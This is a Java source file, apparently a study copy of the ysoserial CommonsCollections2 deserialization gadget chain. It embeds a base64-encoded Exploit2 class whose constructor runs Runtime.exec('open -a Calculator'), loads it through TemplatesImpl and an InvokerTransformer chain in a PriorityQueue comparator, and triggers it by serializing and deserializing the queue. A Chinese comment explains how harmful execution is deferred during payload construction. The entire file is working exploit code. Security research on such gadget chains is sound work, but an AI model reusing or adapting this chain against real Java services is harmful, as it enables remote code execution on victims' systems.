package ysoserial.payloads.forlearn;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;


public class CommonsCollections2_Simple_WithTransformerArray {

    private static void setFiledValue(Object obj, String fieldName, Object fieldValue) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }

    public static void main(String[] args) {
        try {
            byte[] codes = Base64.getDecoder().decode("yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAA1FeHBsb2l0Mi5qYXZhDAAJAAoHACEMACIAIwEAEm9wZW4gLWEgQ2FsY3VsYXRvcgwAJAAlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAJgAKAQAIRXhwbG9pdDIBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAABgAAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQACAAwAAAAaAAYAAAAIAAQACwANABEAEAAPABEAEAAVABIADQAAABAAAv8AEAABBwAOAAEHAA8EAAEAEAARAAIACwAAABkAAAADAAAAAbEAAAABAAwAAAAGAAEAAAAYABIAAAAEAAEAEwABABAAFAACAAsAAAAZAAAABAAAAAGxAAAAAQAMAAAABgABAAAAHQASAAAABAABABMAAQAVAAAAAgAW");
            byte[][] _bytecodes = new byte[][] {
                codes,
            };
            TemplatesImpl templatesObj = new TemplatesImpl();
            setFiledValue(templatesObj, "_bytecodes", _bytecodes);
            setFiledValue(templatesObj, "_name", "whatever");
            setFiledValue(templatesObj, "_tfactory", new TransformerFactoryImpl());

            Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templatesObj),
                new InvokerTransformer("newTransformer", new Class[0], new Object[0]),
            };

            Transformer tmpTransformer = new ConstantTransformer(1);

            /**
             * 因为PriorityQueue#add()操作也会触发比较器的比较操作：
             *   TransformingComparator#compare()
             *
             * 所以为了避免生成序列化数据的过程中触发命令执行，先构造一个无害的ChainedTransformer
             */
            Transformer transformerChain = new ChainedTransformer(tmpTransformer);

            TransformingComparator comparator = new TransformingComparator(transformerChain);
            PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
            queue.add(1);
            queue.add(2);

            setFiledValue(transformerChain, "iTransformers", transformers);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(queue);
            System.out.println(baos.toString());

            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
            Object o = ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
